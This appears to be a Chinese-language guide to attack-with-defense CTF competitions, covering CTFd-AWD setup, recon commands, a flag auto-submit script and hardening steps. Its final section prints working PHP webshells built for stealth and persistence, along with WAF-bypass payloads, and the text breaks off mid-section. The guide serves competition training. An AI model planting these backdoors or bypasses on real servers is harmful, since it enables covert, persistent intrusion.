+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 启动Docker</span>
+</span></span><span class="line"><span class="cl">sudo systemctl start docker <span class="o">&amp;&amp;</span> sudo systemctl <span class="nb">enable</span> docker
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. 克隆CTFd-AWD仓库（含攻防模式插件）</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/zh speed/CTFd-AWD.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CTFd-AWD
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. 启动服务（自动拉取镜像、初始化数据库）</span>
+</span></span><span class="line"><span class="cl">docker-compose up -d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>访问后台
+浏览器打开：<code>http://你的服务器IP:8000</code>
+<ul>
+<li>默认账号：<code>admin</code></li>
+<li>默认密码：<code>password</code>（<strong>立即修改！</strong>）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>三、第二步：配置攻防模式（关键）
+登录后台后，完成以下配置：</p>
+</li>
+<li>
+<ol>
+<li>开启AWD模式</li>
+<li>进入后台 → <strong>Plugins</strong>（插件）</li>
+<li>启用 <strong>CTFd-AWD</strong> 插件</li>
+<li>进入 <strong>AWD Settings</strong>（AWD设置），配置核心参数：</li>
+</ol>
+<ul>
+<li><strong>Flag格式</strong>：<code>flag{[a-zA-Z0-9]{32}}</code>（比赛通用）</li>
+<li><strong>得分规则</strong>：
+<ul>
+<li>攻击成功：+100分</li>
+<li>服务挂掉：-50分</li>
+<li>一血奖励：+20分</li>
+</ul>
+</li>
+<li><strong>回合制</strong>：每 <strong>3分钟</strong> 刷新一次Flag（真实对抗节奏）</li>
+<li><strong>靶机数量</strong>：根据参赛队数定（每队1台）</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>分发靶机（核心步骤）</li>
+</ol>
+<ul>
+<li>方式A：使用自带靶场（推荐）
+CTFd-AWD 内置了 <strong>DVWA、Pikachu、WebGoat</strong> 等常见漏洞靶场，直接分发即可：</li>
+</ul>
+<ol>
+<li>进入 <strong>AWD Targets</strong> → <strong>Add Target</strong></li>
+<li>选择模板（如 <code>DVWA</code>）</li>
+<li>分配给对应队伍（如 Team 1 → Target 1）</li>
+<li>系统自动为每队生成独立靶机IP/端口</li>
+</ol>
+<ul>
+<li>方式B：自定义靶机（真实比赛用）
+如果想用自己写的漏洞环境，按以下步骤：</li>
+</ul>
+<ol>
+<li>编写 Dockerfile（以Web漏洞为例）：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> vulnerables/web-dvwa</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># 替换为你的漏洞代码/配置</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> ./flag.php /var/www/html/<span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>构建镜像：<code>docker build -t team1-target .</code></li>
+<li>启动靶机：<code>docker run -d --name team1 -p 80:80 team1-target</code></li>
+<li>在 AWD 后台添加靶机：IP = 服务器IP，端口 = 80</li>
+</ol>
+</li>
+<li>
+<p>四、第三步：攻击方环境配置（参赛选手）</p>
+<ul>
+<li>
+<ol>
+<li>本地环境（Kali/Parrot）</li>
+</ol>
+<ul>
+<li>系统：<strong>Kali Linux 2023.4+</strong>（自带所有工具）</li>
+<li>网络：与裁判端<strong>互通</strong>（本地虚拟机用Host-Only模式，云服务器用公网）</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>必备工具（CTF攻防必备）
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:left">工具</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">安装命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>Burp Suite</strong></td>
+<td style="text-align:left">拦截请求、漏洞扫描</td>
+<td style="text-align:left">官网下载</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Nmap</strong></td>
+<td style="text-align:left">端口扫描、资产探测</td>
+<td style="text-align:left"><code>sudo apt install nmap</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Dirsearch</strong></td>
+<td style="text-align:left">目录扫描</td>
+<td style="text-align:left"><code>git clone https://github.com/maurosoria/dirsearch.git</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>SQLMap</strong></td>
+<td style="text-align:left">SQL注入自动化</td>
+<td style="text-align:left"><code>sudo apt install sqlmap</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>Python脚本库</strong></td>
+<td style="text-align:left">自动化攻击</td>
+<td style="text-align:left"><code>pip install requests beautifulsoup4</code></td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>攻击流程（背下来！）</li>
+<li><strong>信息收集</strong>：<code>nmap -sV 靶机IP</code> → 开放端口/服务版本</li>
+<li><strong>漏洞扫描</strong>：<code>dirsearch -u http://靶机IP</code> → 发现后台/敏感文件</li>
+<li><strong>漏洞利用</strong>：</li>
+</ol>
+<ul>
+<li>Web漏洞：Burp拦截请求 → 注入Payload → 拿Flag</li>
+<li>命令执行：直接执行 <code>cat /flag</code></li>
+</ul>
+<ol start="4">
+<li><strong>防守</strong>：</li>
+</ol>
+<ul>
+<li>修复漏洞（如删除webshell、修复配置错误）</li>
+<li>开启WAF（如Nginx反向代理+ModSecurity）</li>
+<li>监控日志：<code>tail -f /var/log/nginx/access.log</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>五、第四步：实战模拟（拿分关键）</p>
+<ul>
+<li>
+<ol>
+<li>目标</li>
+</ol>
+</li>
+<li>防守：保证自己的靶机<strong>不被攻击成功、不宕机</strong></li>
+<li>攻击：成功攻击其他队伍靶机，<strong>每回合获取Flag</strong></li>
+<li>
+<ol start="2">
+<li>攻防对抗示例</li>
+</ol>
+</li>
+<li>攻击方操作</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1. 扫描靶机开放端口</span>
+</span></span><span class="line"><span class="cl">nmap -sV 192.168.1.100
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 扫描目录</span>
+</span></span><span class="line"><span class="cl">python3 dirsearch.py -u http://192.168.1.100
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. 利用命令执行漏洞拿Flag</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;http://192.168.1.100?cmd=cat%20/flag&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>防守方操作</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 1. 查看漏洞日志</span>
+</span></span><span class="line"><span class="cl">grep -i <span class="s2">&#34;cmd&#34;</span> /var/log/nginx/access.log
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. 修复命令执行漏洞（删除危险函数）</span>
+</span></span><span class="line"><span class="cl">sed -i <span class="s1">&#39;s/exec//g&#39;</span> /var/www/html/config.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. 重启服务</span>
+</span></span><span class="line"><span class="cl">systemctl restart nginx
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>六、常见问题解决（避坑指南）</p>
+<ul>
+<li>
+<ol>
+<li>靶机无法访问</li>
+</ol>
+<ul>
+<li>检查防火墙：<code>ufw allow 80</code>（开放80端口）</li>
+<li>检查Docker容器：<code>docker ps</code>（确认靶机运行）</li>
+<li>检查网络模式：本地虚拟机用<strong>Host-Only</strong>，云服务器用<strong>公网</strong></li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>判分异常（Flag不识别）</li>
+</ol>
+<ul>
+<li>确认Flag格式与后台一致：<code>flag{xxx}</code></li>
+<li>确认提交URL正确：<code>http://裁判IP/api/awd/submit</code></li>
+<li>检查Token权限：提交时需携带队伍Token</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>攻击被拦截（WAF）</li>
+</ol>
+<ul>
+<li>使用<strong>变量拼接</strong>绕过：<code>a=c;b=at;$a$b flag</code></li>
+<li>使用<strong>异或/取反</strong>绕过：<code>($_GET[_]^_GET[_])('cat flag')</code></li>
+<li>使用<strong>HTTP Header</strong>绕过：<code>X-Forwarded-For: 127.0.0.1</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>超简总结（背会直接上场）</p>
+<ol>
+<li><strong>裁判端</strong>：CTFd + AWD插件（一键部署）</li>
+<li><strong>靶机</strong>：DVWA/Pikachu/自定义漏洞环境</li>
+<li><strong>攻击流程</strong>：信息收集 → 漏洞扫描 → 利用拿Flag</li>
+<li><strong>防守流程</strong>：日志监控 → 漏洞修复 → 服务加固</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>赛前准备
+<ul>
+<li>
+<p>web管理员/SQL密码修改</p>
+</li>
+<li>
+<p>web源码/数据库备份</p>
+</li>
+<li>
+<p>IP/端口探测</p>
+</li>
+<li>
+<p>Flag 自动提交脚本</p>
+</li>
+<li>
+<p>攻防工具集</p>
+</li>
+<li>
+<p>一、赛前 5 分钟必做：加固自己的靶机（保命）</p>
+<ul>
+<li>
+<ol>
+<li>Web 管理员密码 + SQL 密码修改
+<strong>不做这一步，开局直接被打爆！</strong></li>
+</ol>
+<ul>
+<li>1）修改网站后台密码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin 123456 → 立刻改成复杂密码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>2）修改 MySQL / PostgreSQL 密码（非常关键）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># MySQL 修改密码</span>
+</span></span><span class="line"><span class="cl">mysqladmin -u root password <span class="s2">&#34;新密码&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者进入 MySQL 后</span>
+</span></span><span class="line"><span class="cl">ALTER USER <span class="s1">&#39;root&#39;</span>@<span class="s1">&#39;localhost&#39;</span> IDENTIFIED BY <span class="s1">&#39;新密码&#39;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>3）修改网站配置文件中的数据库密码
+找到：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">config.php
+</span></span><span class="line"><span class="cl">db.php
+</span></span><span class="line"><span class="cl">database.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div>把里面的：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root / root
+</span></span><span class="line"><span class="cl">root / 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div>全部改掉！</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>Web 源码 + 数据库完整备份（被黑了能还原）</li>
+</ol>
+<ul>
+<li>1）源码打包备份</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html
+</span></span><span class="line"><span class="cl">zip -r web_backup.zip ./*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>2）数据库备份（MySQL）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysqldump -u root -p 数据库名 &gt; db_backup.sql
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>作用</strong>：
+一旦被写木马、删文件、脱库 → <strong>直接解压覆盖 + 导入数据库</strong> 立刻恢复！</p>
+</li>
+<li>
+<p>二、赛前必做：情报收集（知己知彼）</p>
+<ul>
+<li>
+<ol>
+<li>全队伍 IP / 端口探测</li>
+</ol>
+<ul>
+<li>命令（直接复制）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV 192.168.1.0/24 --open
+</span></span></code></pre></td></tr></table>
+</div>
+</div>得到：
+<ul>
+<li>所有队伍靶机 IP</li>
+<li>开放端口（80、3306、22、8080&hellip;）</li>
+<li>服务版本（nginx、apache、mysql、ssh）</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>目录扫描（找漏洞点、后门、admin 页面）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u http://靶机IP -e *
+</span></span></code></pre></td></tr></table>
+</div>
+</div>找：
+<ul>
+<li>phpinfo</li>
+<li>info.php</li>
+<li>test.php</li>
+<li>login.php</li>
+<li>admin.php</li>
+<li>backup.zip</li>
+<li>www.zip</li>
+<li>flag.php</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>三、攻防神器：Flag 自动提交脚本（核心拿分）<br>
+比赛中：<br>
+<strong>每 2~5 分钟刷新一次 Flag</strong>
+手动提交根本来不及！</p>
+<ul>
+<li>自动提交脚本（Python 直接用）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 配置</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.1.xxx/get_flag&#34;</span>  <span class="c1"># 获取flag的漏洞URL</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUBMIT_URL</span> <span class="o">=</span> <span class="s2">&#34;http://裁判平台/api/submit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;team_token=xxxxxxxx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;flag{&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] 获取Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">submit_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;flag&#34;</span><span class="p">:</span> <span class="n">flag</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SUBMIT_URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] 提交结果:&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">submit_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>  <span class="c1"># 每10秒尝试一次</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>作用
+<ul>
+<li>自动打靶机拿 Flag</li>
+<li>自动提交得分</li>
+<li><strong>多开几个 = 多线得分 = 排名暴涨</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>四、赛前必备工具集（AWD 攻防全能工具箱）</p>
+<ul>
+<li>
+<ol>
+<li>信息收集</li>
+</ol>
+<ul>
+<li>nmap（端口扫描）</li>
+<li>dirsearch（目录扫描）</li>
+<li>whatweb（指纹识别）</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>Web 漏洞利用</li>
+</ol>
+<ul>
+<li>Burp Suite（核心）</li>
+<li>SQLMap（SQL 注入）</li>
+<li>curl（命令行发包）</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>代码审计</li>
+</ol>
+<ul>
+<li>VSCode（快速找漏洞）</li>
+<li>find 命令（查找后门、危险函数）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep -r <span class="s2">&#34;eval&#34;</span> /var/www/html
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;system&#34;</span> /var/www/html
+</span></span><span class="line"><span class="cl">grep -r <span class="s2">&#34;exec&#34;</span> /var/www/html
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<ol start="4">
+<li>自动化攻击</li>
+</ol>
+<ul>
+<li>Python requests（批量攻击）</li>
+<li>自动提交 Flag 脚本</li>
+<li>批量漏洞 EXP 脚本</li>
+</ul>
+</li>
+<li>
+<ol start="5">
+<li>防守加固</li>
+</ol>
+<ul>
+<li>iptables（防火墙）</li>
+<li>logwatch（日志监控）</li>
+<li>netstat（查看连接）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>五、赛前准备终极流程（背下来！）</p>
+<ol>
+<li><strong>修改所有密码</strong>（后台+数据库+SSH）</li>
+<li><strong>备份源码 + 数据库</strong>（防止被黑无法恢复）</li>
+<li><strong>扫描所有队伍 IP/端口</strong></li>
+<li><strong>扫描目录、找漏洞点</strong></li>
+<li><strong>写好自动提交 Flag 脚本</strong></li>
+<li><strong>打开 Burp、准备好 Payload</strong></li>
+<li><strong>开启日志监控</strong></li>
+</ol>
+</li>
+<li>
+<p>超简总结（攻防赛必背）</p>
+<ul>
+<li><strong>改密码 = 保命</strong></li>
+<li><strong>备份 = 不翻车</strong></li>
+<li><strong>扫端口 = 找敌人</strong></li>
+<li><strong>扫目录 = 找漏洞</strong></li>
+<li><strong>自动提交脚本 = 稳定拿分</strong></li>
+<li><strong>工具集 = 战斗力</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CTF 攻防模式（AWD）红队攻击实战<br>
+包含三大核心技能：
+<ul>
+<li>
+<p><strong>Shell 不复用实战（不占端口，隐藏通信）</strong></p>
+</li>
+<li>
+<p><strong>不死马 / 内存马实战（删了文件还能控，真正杀不死）</strong></p>
+</li>
+<li>
+<p><strong>混淆干扰实战（垃圾代码轰炸，让对手心态爆炸）</strong></p>
+</li>
+<li>
+<p>一、Shell 不复用实战（隐藏后门，不留痕迹）</p>
+<ul>
+<li>
+<ol>
+<li>Shell 不复用
+普通一句话木马：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>缺点：<strong>文件落地、端口监听、容易被发现</strong></p>
+<p>不复用 Shell：
+<strong>无文件、无端口、无进程、无痕渗透</strong></p>
+<ul>
+<li>
+<ol start="2">
+<li>实战：PHP 无文件复用 Shell（不死）
+原理：利用 <strong>php://input</strong> 或 <strong>环境变量</strong> 接收数据，<strong>不写文件</strong>。</li>
+</ol>
+</li>
+<li>Payload 1：请求头后门（最强）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用方式</strong>：
+在 HTTP 请求头 <code>User-Agent</code> 里传函数，POST 传命令。
+对手扫目录 <strong>根本扫不到</strong>！</p>
+<ul>
+<li>Payload 2：无文件临时后门
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;/tmp/.&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[1]);?&gt;&#34;</span><span class="p">);</span><span class="k">include</span> <span class="s2">&#34;/tmp/.&#34;</span><span class="p">;</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;/tmp/.&#34;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><strong>特点</strong>：
+<ul>
+<li>运行后<strong>自动删除自己</strong></li>
+<li>内存中执行</li>
+<li>对手 <code>find /</code> 都找不到文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>二、不死马 / 内存马实战（真正杀不死）</p>
+<ul>
+<li>
+<ol>
+<li>什么是内存马？
+<strong>写入内存，不写硬盘</strong></li>
+</ol>
+<ul>
+<li><code>rm -rf /var/www/html/*</code> 删不掉</li>
+<li><code>kill -9 进程号</code> 杀不死</li>
+<li>重启服务才可能消失</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>PHP 内存马实战（AWD 通杀）</li>
+</ol>
+</li>
+<li>直接写入代码：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">register_shutdown_function</span><span class="p">(</span><span class="k">function</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;/var/www/html/.index.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理</strong>：
+脚本执行结束、被删除、被杀死后，<strong>最后一刻自动重建后门</strong>！</p>
+<ul>
+<li>
+<ol start="3">
+<li>Linux 不死马（进程守护）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
